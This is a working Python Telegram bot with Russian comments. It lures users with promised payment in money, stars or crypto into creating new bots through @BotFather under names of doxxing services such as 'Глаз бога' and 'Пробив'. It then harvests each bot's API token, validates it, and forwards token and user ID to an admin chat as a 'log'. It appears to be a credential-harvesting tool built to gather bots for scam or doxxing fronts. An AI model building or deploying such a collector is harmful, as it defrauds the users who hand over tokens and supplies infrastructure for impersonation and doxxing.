import asyncio
import random
import string
import re
import aiohttp
import os
from aiogram import Bot, Dispatcher, types, F
from aiogram.filters import Command
from aiogram.types import ReplyKeyboardMarkup, KeyboardButton
import config

# Настройки бота
bot = Bot(token=config.BOT_TOKEN)
dp = Dispatcher()

# Файл для хранения уже сданных токенов (защита от дублей)
DB_FILE = "used_tokens.txt"

# Твой расширенный список названий
NAMES = ["Вектор", "Виктор", "Пробив", "Пробить", "Докс", "Шоколадный глаз", "Глаз бога", "Пробивала", "Шерлок", "Духлес"]

# Функция генерации рандомного юзернейма
def gen_username():
    letters = string.ascii_lowercase
    random_str = ''.join(random.choice(letters) for _ in range(8))
    return f"{random_str}_bot"

# Регулярка для проверки формата токена
TOKEN_PATTERN = re.compile(r'^\d{8,10}:[a-zA-Z0-9_-]{35,45}$')

# Главная клавиатура
main_kb = ReplyKeyboardMarkup(
    keyboard=[[KeyboardButton(text="Подобрать задание ⚙️")]],
    resize_keyboard=True
)

# Функция 1: Проверка токена на валидность через API Telegram
async def check_token_validity(token: str):
    url = f"https://api.telegram.org/bot{token}/getMe"
    async with aiohttp.ClientSession() as session:
        try:
            async with session.get(url, timeout=5) as response:
                if response.status == 200:
                    data = await response.json()
                    return data.get("result")
                return None
        except:
            return None

# Функция 2: Проверка на дубликаты (чтобы не сдавали одно и то же)
def is_duplicate(token: str):
    if not os.path.exists(DB_FILE):
        return False
    with open(DB_FILE, "r") as f:
        used_tokens = f.read().splitlines()
    return token in used_tokens

# Сохранение токена в список использованных
def save_token(token: str):
    with open(DB_FILE, "a") as f:
        f.write(token + "\n")

# Обработка команды /start
@dp.message(Command("start"))
async def cmd_start(message: types.Message):
    await message.answer(
        "👋 Привет! Здесь ты можешь сдать бота за деньги / звёзды / крипту.\n"
        "Нажми кнопку ниже, и я подберу задание для тебя.",
        reply_markup=main_kb
    )

# ТА САМАЯ ПОШАГОВАЯ ИНСТРУКЦИЯ (ШАГИ ВЕРНУЛИСЬ)
@dp.message(F.text == "Подобрать задание ⚙️")
async def step_1(message: types.Message):
    name = random.choice(NAMES)
    username = gen_username()
    
    # Шаг 1
    await message.answer("1️⃣ Шаг первый:\nПерейдите в @BotFather, нажмите СТАРТ и напишите команду /newbot.")
    await asyncio.sleep(1.5) # Пауза для имитации раздумий
    
    # Шаг 2
    await message.answer("Теперь перешлите сообщение ниже (название бота) туда:")
    await message.answer(f"`{name}`", parse_mode="MarkdownV2")
    await asyncio.sleep(1.5)
    
    # Шаг 3
    await message.answer("Когда он попросит юзернейм, перешлите ему это сообщение:")
    await message.answer(f"`{username}`", parse_mode="MarkdownV2")
    await asyncio.sleep(1)
    
    # Шаг 4
    await message.answer(
        "3️⃣ Шаг третий:\nПосле этого @BotFather пришлет вам длинный API токен (цифры:буквы).\n\n"
        "Скопируйте его и пришлите мне прямо сюда!"
    )

# Обработка входящего токена
@dp.message()
async def handle_message(message: types.Message):
    token = message.text.strip() if message.text else ""
    
    # Сначала проверяем, не нажал ли пользователь кнопку снова
    if token == "Подобрать задание ⚙️":
        return # Это обработает другой хендлер

    # Проверяем формат токена
    if TOKEN_PATTERN.match(token):
        # Проверка на дубликаты
        if is_duplicate(token):
            await message.answer("❌ Этот токен уже был сдан ранее! Попробуйте создать новый.")
            return

        # Проверка на валидность (Функция 1 и 3)
        bot_info = await check_token_validity(token)
        
        if bot_info:
            save_token(token)
            
            bot_username = bot_info.get("username")
            bot_name = bot_info.get("first_name")
            
            # Отправка лога в твой админ-чат
            log_text = (
                "📥 **НОВЫЙ ВАЛИДНЫЙ ЛОГ!**\n"
                f"👤 **От:** @{message.from_user.username or 'ID ' + str(message.from_user.id)}\n"
                f"🆔 **ID:** `{message.from_user.id}`\n"
                f"🤖 **Бот:** @{bot_username} ({bot_name})\n"
                f"🔑 **Токен:** `{token}`"
            )
            
            try:
                await bot.send_message(chat_id=config.ADMIN_CHAT_ID, text=log_text, parse_mode="Markdown")
                await message.answer("✅ Токен успешно получен и отправлен на проверку! В течении 72 часов с вами свяжется администратор.")
            except Exception as e:
                print(f"Ошибка логирования: {e}")
                await message.answer("✅ Токен принят! Ожидайте связи с администратором.")
        else:
            await message.answer("❌ Нерабочий токен. Убедитесь, что скопировали его полностью из @BotFather.")
    else:
        # Если прислали не токен и не нажали кнопку
        await message.answer("❌ Это не похоже на API токен. Пожалуйста, следуйте инструкции и пришлите токен от @BotFather.")

# Запуск бота
async def main():
    print("Бот запущен. Все шаги и проверки активны!")
    await dp.start_polling(bot)

if __name__ == "__main__":
    asyncio.run(main())
